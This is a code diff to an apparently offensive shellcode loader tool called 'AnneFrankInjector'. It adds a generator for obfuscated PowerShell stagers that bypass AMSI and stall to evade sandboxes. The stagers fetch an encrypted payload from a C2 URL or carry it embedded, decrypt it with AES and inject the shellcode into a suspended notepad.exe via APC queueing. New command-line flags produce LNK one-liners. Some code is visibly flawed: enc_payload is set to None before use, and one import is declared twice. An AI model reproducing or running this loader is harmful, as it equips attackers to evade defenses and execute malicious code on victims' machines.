@@ -7,6 +7,8 @@ import random
 import subprocess
 import shutil
 import errno
+import base64
+import string
 
 from importlib import resources
 from core.hashing import Hasher
@@ -14,6 +16,172 @@ from argparse import ArgumentParser
 from core.utils import Colors, banner
 from core.encryption import Encryption
 
+def generate_powershell_stager(enc_payload, key, iv, c2_url=None):
+    """
+    Returns a tuple: (ps_script_content, one_liner_command)
+    """
+    # Random variable names (longer, more varied)
+    var_names = {
+        'amsi': ''.join(random.choices(string.ascii_letters, k=12)),
+        'enc': ''.join(random.choices(string.ascii_letters, k=12)),
+        'key': ''.join(random.choices(string.ascii_letters, k=12)),
+        'iv': ''.join(random.choices(string.ascii_letters, k=12)),
+        'aes': ''.join(random.choices(string.ascii_letters, k=12)),
+        'dec': ''.join(random.choices(string.ascii_letters, k=12)),
+        'code': ''.join(random.choices(string.ascii_letters, k=12)),
+        'class_name': ''.join(random.choices(string.ascii_letters, k=12)),
+        'delay': ''.join(random.choices(string.ascii_letters, k=12)),
+        'startup': ''.join(random.choices(string.ascii_letters, k=12)),
+        'pi': ''.join(random.choices(string.ascii_letters, k=12)),
+        'si': ''.join(random.choices(string.ascii_letters, k=12)),
+        'hProcess': ''.join(random.choices(string.ascii_letters, k=12)),
+        'hThread': ''.join(random.choices(string.ascii_letters, k=12)),
+        'addr': ''.join(random.choices(string.ascii_letters, k=12)),
+    }
+
+    # AMSI bypass (standard technique)
+    amsi_bypass = f"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
+
+    # Random delay (5-10 seconds) using a benign API call (GetTickCount)
+    delay_seconds = random.randint(5, 10)
+    delay_ms = delay_seconds * 1000
+    delay_loop = f"""
+$start = [System.Environment]::TickCount
+while (([System.Environment]::TickCount - $start) -lt {delay_ms}) {{ 
+    $dummy = 1 + 1
+}}
+"""
+
+    # Build key and IV strings
+    key_str = ','.join(str(b) for b in key)
+    iv_str = ','.join(str(b) for b in iv)
+
+    # Payload handling (remote or embedded)
+    if c2_url:
+        script = f"""
+{amsi_bypass}
+${var_names['enc']} = (Invoke-WebRequest '{c2_url}' -UseBasicParsing).Content
+${var_names['key']} = [byte[]]@({key_str})
+${var_names['iv']} = [byte[]]@({iv_str})
+${var_names['aes']} = [System.Security.Cryptography.Aes]::Create()
+${var_names['aes']}.Key = ${var_names['key']}
+${var_names['aes']}.IV = ${var_names['iv']}
+${var_names['dec']} = ${var_names['aes']}.CreateDecryptor().TransformFinalBlock(${var_names['enc']}, 0, ${var_names['enc']}.Length)
+"""
+    else:
+        b64 = base64.b64encode(enc_payload).decode()
+        script = f"""
+{amsi_bypass}
+${var_names['enc']} = [System.Convert]::FromBase64String('{b64}')
+${var_names['key']} = [byte[]]@({key_str})
+${var_names['iv']} = [byte[]]@({iv_str})
+${var_names['aes']} = [System.Security.Cryptography.Aes]::Create()
+${var_names['aes']}.Key = ${var_names['key']}
+${var_names['aes']}.IV = ${var_names['iv']}
+${var_names['dec']} = ${var_names['aes']}.CreateDecryptor().TransformFinalBlock(${var_names['enc']}, 0, ${var_names['enc']}.Length)
+"""
+
+    # C# code obfuscated: split into multiple strings and concatenate
+    csharp_parts = [
+        "using System;",
+        "using System.Runtime.InteropServices;",
+        "public class {0} {{",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern bool CloseHandle(IntPtr hObject);",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern uint ResumeThread(IntPtr hThread);",
+        "    [DllImport(\"kernel32.dll\", SetLastError=true)]",
+        "    public static extern bool CloseHandle(IntPtr hObject);",
+        "    [StructLayout(LayoutKind.Sequential)]",
+        "    public struct STARTUPINFO {",
+        "        public uint cb;",
+        "        public string lpReserved;",
+        "        public string lpDesktop;",
+        "        public string lpTitle;",
+        "        public uint dwX;",
+        "        public uint dwY;",
+        "        public uint dwXSize;",
+        "        public uint dwYSize;",
+        "        public uint dwXCountChars;",
+        "        public uint dwYCountChars;",
+        "        public uint dwFillAttribute;",
+        "        public uint dwFlags;",
+        "        public short wShowWindow;",
+        "        public short cbReserved2;",
+        "        public IntPtr lpReserved2;",
+        "        public IntPtr hStdInput;",
+        "        public IntPtr hStdOutput;",
+        "        public IntPtr hStdError;",
+        "    }",
+        "    [StructLayout(LayoutKind.Sequential)]",
+        "    public struct PROCESS_INFORMATION {",
+        "        public IntPtr hProcess;",
+        "        public IntPtr hThread;",
+        "        public uint dwProcessId;",
+        "        public uint dwThreadId;",
+        "    }",
+        "}}"
+    ]
+
+    # Randomize class name
+    class_name = var_names['class_name']
+    # Build the C# code with escaped braces for Python formatting
+    csharp_code = ''.join(csharp_parts)
+    # Double all braces to escape them
+    csharp_code = csharp_code.replace('{', '{{').replace('}', '}}')
+    # Restore the placeholder for the class name (which got doubled)
+    csharp_code = csharp_code.replace('{{0}}', '{0}')
+    # Format with class_name
+    csharp_code = csharp_code.format(class_name)
+
+    # The injection routine will:
+    # 1. Create a new notepad.exe process suspended.
+    # 2. Allocate memory in it and write the decrypted shellcode.
+    # 3. Queue an APC to the main thread.
+    # 4. Resume the thread.
+    injection_code = f"""
+# Create a suspended notepad process
+$si = New-Object {class_name}+STARTUPINFO
+$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
+$pi = New-Object {class_name}+PROCESS_INFORMATION
+$notepad = "C:\\Windows\\System32\\notepad.exe"
+$null = [{class_name}]::CreateProcess($null, $notepad, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
+
+# Allocate memory in the new process
+$addr = [{class_name}]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, ${var_names['dec']}.Length, 0x3000, 0x40)
+# Write shellcode
+[{class_name}]::WriteProcessMemory($pi.hProcess, $addr, ${var_names['dec']}, ${var_names['dec']}.Length, [ref]0)
+# Queue APC to the main thread
+[{class_name}]::QueueUserAPC($addr, $pi.hThread, [IntPtr]::Zero)
+# Resume thread
+[{class_name}]::ResumeThread($pi.hThread)
+# Close handles
+[{class_name}]::CloseHandle($pi.hProcess)
+[{class_name}]::CloseHandle($pi.hThread)
+"""
+    # Add delay before injection (already added earlier)
+    script += f"""
+# Optional delay to avoid sandbox detection
+{delay_loop}
+# Perform injection
+{injection_code}
+"""
+
+    # Build one-liner: remove newlines and escape quotes
+    one_liner = script.replace('\n', '').replace('\r', '').replace("'", "''")
+    return script, one_liner
 
 def main():
     parser = ArgumentParser(description="AnneFrankInjector", epilog="Author: Excalibra")
@@ -38,6 +206,9 @@ def main():
     parser_staged.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Process to spawn.")
     parser_staged.add_argument("--injection", choices=["apc", "enumwindows"], default="apc", help="Injection technique")
     parser_staged.add_argument("--staggered", action="store_true", help="Use two-stage registry persistence")
+    parser_staged.add_argument("--reflective", action="store_true", help="Output reflective shellcode (no PE)")
+    parser_staged.add_argument("--lnk-stager", action="store_true", help="Generate PowerShell one‑liner for LNK")
+    parser_staged.add_argument("--c2-url", type=str, help="URL for remote payload (used with --lnk-stager)")
     parser_staged.epilog = "Example: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o myloader -e -s"
 
     # ---------- Stageless ----------
@@ -56,6 +227,9 @@ def main():
     parser_stageless.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Process to spawn.")
     parser_stageless.add_argument("--injection", choices=["apc", "enumwindows"], default="apc", help="Injection technique")
     parser_stageless.add_argument("--staggered", action="store_true", help="Use two-stage registry persistence")
+    parser_stageless.add_argument("--reflective", action="store_true", help="Output reflective shellcode (no PE)")
+    parser_stageless.add_argument("--lnk-stager", action="store_true", help="Generate PowerShell one‑liner for LNK")
+    parser_stageless.add_argument("--c2-url", type=str, help="URL for remote payload (used with --lnk-stager)")
     parser_stageless.epilog = "Example: python main.py stageless -p shellcode.bin -o myloader -e -s"
 
     args = parser.parse_args()
@@ -211,6 +385,25 @@ def main():
                         with open(f"{dst_directory}/{filename}", "w") as f:
                             f.write(main_data)
                 shutil.copy(args.payload, f"{args.output}.bin" if args.output else "afloader.bin")
+                enc_payload = None  # not used
+
+            # PowerShell stager generation (LNK)
+            if args.lnk_stager:
+                if not args.encrypt:
+                    print(Colors.red("[!] --lnk-stager requires encryption (--encrypt)."))
+                    sys.exit(1)
+                output_ps1 = f"{args.output}.ps1" if args.output else "afloader.ps1"
+                # Convert key/iv from C array format to bytes
+                key_hex = key.replace('0x', '').replace(',', '').replace(' ', '')
+                iv_hex = iv.replace('0x', '').replace(',', '').replace(' ', '')
+                key_bytes = bytes.fromhex(key_hex)
+                iv_bytes = bytes.fromhex(iv_hex)
+                script, one_liner = generate_powershell_stager(enc_payload, key_bytes, iv_bytes, c2_url=args.c2_url)
+                with open(output_ps1, "w") as f:
+                    f.write(script)
+                print(Colors.green(f"[+] PowerShell stager script saved to {output_ps1}"))
+                print(Colors.green(f"[+] One-liner: {one_liner}"))
+                sys.exit(0)
 
             # Scrambling (if you have code, keep it; this is a placeholder)
             if args.scramble:
@@ -424,6 +617,25 @@ def main():
                         main_data = main_data.replace("AES_DecryptBuffer", "//AES_DecryptBuffer")
                         with open(f"{dst_directory}/{filename}", "w") as f:
                             f.write(main_data)
+                enc_payload = None  # not used
+
+            # PowerShell stager generation (LNK)
+            if args.lnk_stager:
+                if not args.encrypt:
+                    print(Colors.red("[!] --lnk-stager requires encryption (--encrypt)."))
+                    sys.exit(1)
+                output_ps1 = f"{args.output}.ps1" if args.output else "afloader.ps1"
+                # Convert key/iv from C array format to bytes
+                key_hex = key.replace('0x', '').replace(',', '').replace(' ', '')
+                iv_hex = iv.replace('0x', '').replace(',', '').replace(' ', '')
+                key_bytes = bytes.fromhex(key_hex)
+                iv_bytes = bytes.fromhex(iv_hex)
+                script, one_liner = generate_powershell_stager(enc_payload, key_bytes, iv_bytes, c2_url=args.c2_url)
+                with open(output_ps1, "w") as f:
+                    f.write(script)
+                print(Colors.green(f"[+] PowerShell stager script saved to {output_ps1}"))
+                print(Colors.green(f"[+] One-liner: {one_liner}"))
+                sys.exit(0)
 
             # Scrambling (placeholder)
             if args.scramble:
